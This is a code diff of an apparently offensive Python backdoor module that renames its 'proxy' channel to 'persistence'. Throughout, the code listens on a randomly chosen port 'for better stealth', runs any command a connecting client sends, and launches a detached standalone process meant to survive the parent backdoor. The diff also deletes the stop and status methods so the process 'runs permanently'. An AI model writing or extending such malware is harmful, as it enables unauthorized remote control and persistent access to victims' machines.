@@ -12,15 +12,15 @@ import os
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from configuration import SERVER_IP, SERVER_PORT
 
-class HiddenChannel:
-    """Simple independent backdoor proxy - no external server needed"""
+class PersistentChannel:
+    """Simple independent backdoor persistence - no external server needed"""
 
     def __init__(self, listen_port=None):
         self.listen_port = listen_port  # Will be set to random port
         self.is_running = False
         self.channel_socket = None
         self.channel_thread = None
-        self.proxy_process = None  # For standalone process
+        self.persistence_process = None  # For standalone process
         self.connections = {}  # Track active connections
         self.connection_count = 0
         self.start_time = None
@@ -47,7 +47,7 @@ class HiddenChannel:
         connection_id = f"conn_{self.connection_count}"
         self.connection_count += 1
         
-        print(f"[PROXY] Client connected: {client_address}")
+        print(f"[PERSISTENCE] Client connected: {client_address}")
         
         try:
             # Store connection info
@@ -73,7 +73,7 @@ class HiddenChannel:
                         if command.startswith('"') and command.endswith('"'):
                             command = command[1:-1]
                         
-                        print(f"[PROXY] Executing command: {command}")
+                        print(f"[PERSISTENCE] Executing command: {command}")
                         
                         # Execute command directly on Windows
                         if command.lower() == 'quit' or command.lower() == 'exit':
@@ -109,19 +109,19 @@ class HiddenChannel:
                         
                         # Send response back to client
                         client_socket.send(response.encode())
-                        print(f"[PROXY] Response sent ({len(response)} bytes)")
+                        print(f"[PERSISTENCE] Response sent ({len(response)} bytes)")
                         
                     except Exception as e:
                         error_response = f"Error processing command: {str(e)}"
                         client_socket.send(error_response.encode())
-                        print(f"[PROXY] Command error: {e}")
+                        print(f"[PERSISTENCE] Command error: {e}")
                         
                 except Exception as e:
-                    print(f"[PROXY] Connection error: {e}")
+                    print(f"[PERSISTENCE] Connection error: {e}")
                     break
             
         except Exception as e:
-            print(f"[PROXY] Client error: {e}")
+            print(f"[PERSISTENCE] Client error: {e}")
         finally:
             # Clean up client socket
             try:
@@ -130,12 +130,12 @@ class HiddenChannel:
                 pass
             if connection_id in self.connections:
                 del self.connections[connection_id]
-            print(f"[PROXY] Client disconnected: {client_address}")
+            print(f"[PERSISTENCE] Client disconnected: {client_address}")
     
     # Removed complex forwarding - now handling commands directly
     
-    def proxy_server_loop(self):
-        """Main proxy server loop"""
+    def persistence_server_loop(self):
+        """Main persistence server loop"""
         try:
             self.channel_socket = self.create_stealth_socket()
             if not self.channel_socket:
@@ -173,15 +173,15 @@ class HiddenChannel:
                 except:
                     pass
     
-    def start_proxy_channel(self):
-        """Start the proxy channel as standalone process"""
+    def start_persistence_channel(self):
+        """Start the persistence channel as standalone process"""
         if self.is_running:
-            return False, "proxy channel already running"
+            return False, "persistence channel already running"
         
         try:
             # Get path to standalone proxy script (in same features folder)
             current_dir = os.path.dirname(os.path.abspath(__file__))
-            standalone_script = os.path.join(current_dir, "standalone_proxy.py")
+            standalone_script = os.path.join(current_dir, "standalone_process.py")
             
             # Start standalone proxy process (survives even when backdoor.py stops)
             python_exe = sys.executable
@@ -194,7 +194,7 @@ class HiddenChannel:
             # Start process in background (detached from parent)
             if os.name == 'nt':  # Windows
                 # Use DETACHED_PROCESS and CREATE_NEW_PROCESS_GROUP for full independence
-                self.proxy_process = subprocess.Popen(
+                self.persistence_process = subprocess.Popen(
                     cmd,
                     creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
                     stdout=subprocess.DEVNULL,
@@ -202,7 +202,7 @@ class HiddenChannel:
                     stdin=subprocess.DEVNULL
                 )
             else:  # Unix-like
-                self.proxy_process = subprocess.Popen(
+                self.persistence_process = subprocess.Popen(
                     cmd,
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
@@ -222,55 +222,22 @@ class HiddenChannel:
                 
                 if result == 0:
                     self.is_running = True
-                    return True, f"permanent proxy started on port {self.listen_port} (PID: {self.proxy_process.pid})"
+                    return True, f"permanent persistence started on port {self.listen_port} (PID: {self.persistence_process.pid})"
                 else:
-                    return False, f"Failed to connect to proxy on port {self.listen_port}"
+                    return False, f"Failed to connect to persistence on port {self.listen_port}"
             except:
-                return False, "Failed to test proxy connection"
+                return False, "Failed to test persistence connection"
                 
         except Exception as e:
-            return False, f"Failed to start standalone proxy: {str(e)}"
+            return False, f"Failed to start standalone persistence: {str(e)}"
     
-    def stop_proxy_channel(self):
-        """Stop the proxy channel"""
-        if not self.is_running:
-            return False, "proxy channel not running"
-        
-        self.is_running = False
-        
-        # Terminate standalone process
-        if self.proxy_process:
-            try:
-                self.proxy_process.terminate()
-                self.proxy_process.wait(timeout=3)
-            except:
-                try:
-                    self.proxy_process.kill()
-                except:
-                    pass
-        
-        return True, f"proxy channel stopped"
-    
-    # No external target connection needed in simple approach
-    
-    def get_proxy_status(self):
-        """Get current proxy status and statistics"""
-        status = {
-            'is_running': self.is_running,
-            'listen_port': self.listen_port,
-            'start_time': self.start_time.isoformat() if self.start_time else None,
-            'active_connections': len(self.connections),
-            'total_connections': self.connection_count,
-            'uptime_seconds': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
-        }
-        
-        return status
+    # Removed stop and status methods - persistence runs permanently
     
 
 
 
-class proxyManager:
-    """Manage proxy mechanisms for the hidden channel"""
+class PersistenceManager:
+    """Manage persistence mechanisms for the hidden channel"""
     
     def __init__(self, channel_instance):
         self.channel = channel_instance
@@ -337,18 +304,18 @@ class proxyManager:
             return False, f"Network info error: {str(e)}"
 
 
-class Backdoorproxy:
-    """Main manager for backdoor proxy operations"""
+class BackdoorPersistence:
+    """Main manager for backdoor persistence operations"""
     
     def __init__(self):
         # Simple approach - no external target needed
         self.channel = None
         self.proxy_mgr = None
     
-    def initialize_proxy(self, listen_port=None):
-        """Initialize the proxy channel"""
-        self.channel = HiddenChannel(listen_port)
-        self.proxy_mgr = proxyManager(self.channel)
+    def initialize_persistence(self, listen_port=None):
+        """Initialize the persistence channel"""
+        self.channel = PersistentChannel(listen_port)
+        self.persistence_mgr = PersistenceManager(self.channel)
         
         # Find available port if none specified
         if listen_port is None:
@@ -356,101 +323,61 @@ class Backdoorproxy:
             max_attempts = 10
             for attempt in range(max_attempts):
                 random_port = random.randint(8000, 9999)
-                in_use, port_msg = self.proxy_mgr.check_port_usage(random_port)
+                in_use, port_msg = self.persistence_mgr.check_port_usage(random_port)
                 if in_use == False:  # Port is available
                     self.channel.listen_port = random_port
                     break
             else:
                 # If no random port found, use find_available_port as fallback
-                available_port = self.proxy_mgr.find_available_port()
+                available_port = self.persistence_mgr.find_available_port()
                 if available_port:
                     self.channel.listen_port = available_port
                 else:
                     return False, "No available ports found"
         
-        return True, f"proxy initialized on port {self.channel.listen_port}"
+        return True, f"persistence initialized on port {self.channel.listen_port}"
     
-    def start_proxy_operations(self):
-        """Start proxy operations with automatic new random port selection"""
+    def start_persistence_operations(self):
+        """Start persistence operations with automatic new random port selection"""
         # Always reinitialize with a new random port for better stealth
-        success, msg = self.initialize_proxy()
+        success, msg = self.initialize_persistence()
         if not success:
             return False, msg
         
-        # Start the proxy channel
-        return self.channel.start_proxy_channel()
+        # Start the persistence channel
+        return self.channel.start_persistence_channel()
     
-    
-    def stop_proxy_operations(self):
-        """Stop proxy operations"""
-        if self.channel:
-            return self.channel.stop_proxy_channel()
-        else:
-            return False, "No proxy channel found"
-    
-    def get_proxy_status(self):
-        """Get comprehensive proxy status"""
-        if not self.channel:
-            return {'error': 'proxy not initialized'}
-        
-        channel_status = self.channel.get_proxy_status()
-        
-        # Add system information
-        in_use, port_msg = self.proxy_mgr.check_port_usage()
-        
-        status = {
-            'proxy': channel_status,
-            'port_status': port_msg,
-            'system_time': datetime.now().isoformat()
-        }
-        
-        return status
+    # Removed stop and status methods - persistence runs permanently
     
 
 
 
 # Factory function to create backdoor proxy manager
-def create_backdoor_proxy():
-    """Create backdoor proxy manager instance"""
-    return Backdoorproxy()
+def create_backdoor_persistence():
+    """Create backdoor persistence manager instance"""
+    return BackdoorPersistence()
 
 
-# Test the proxy functionality
+# Test the persistence functionality
 if __name__ == "__main__":
-    print("Testing Backdoor proxy System...")
+    print("Testing Backdoor Persistence System...")
     
-    # Create proxy manager
-    persist_mgr = create_backdoor_proxy()
+    # Create persistence manager
+    persist_mgr = create_backdoor_persistence()
     
-    # Initialize proxy
-    success, msg = persist_mgr.initialize_proxy()
+    # Initialize persistence
+    success, msg = persist_mgr.initialize_persistence()
     print(f"Initialize: {msg}")
     
     if success:
-        # Get initial status
-        status = persist_mgr.get_proxy_status()
-        print(f"\nInitial Status:")
-        print(f"  proxy Port: {status['proxy']['listen_port']}")
-        print(f"  Port Available: {status['port_status']}")
-        print(f"  Mode: Direct command execution")
-        
-        # Test starting the proxy
-        print(f"\nTesting proxy start...")
-        success, msg = persist_mgr.start_proxy_operations()
+        print(f"\nTesting persistence start...")
+        success, msg = persist_mgr.start_persistence_operations()
         print(f"Start result: {msg}")
         
         if success:
-            # Show running status
-            time.sleep(1)
-            status = persist_mgr.get_proxy_status()
-            print(f"\nRunning Status:")
-            print(f"  Is Running: {status['proxy']['is_running']}")
-            print(f"  Uptime: {status['proxy']['uptime_seconds']:.1f} seconds")
-            print(f"  Active Connections: {status['proxy']['active_connections']}")
-            
-            # Test stopping
-            time.sleep(2)
-            success, msg = persist_mgr.stop_proxy_operations()
-            print(f"\nStop result: {msg}")
+            print(f"\nPersistence started successfully!")
+            print(f"Process will run permanently in background.")
+        else:
+            print(f"Failed to start persistence: {msg}")
     
-    print("\nproxy test completed!")
+    print("\nPersistence test completed!")
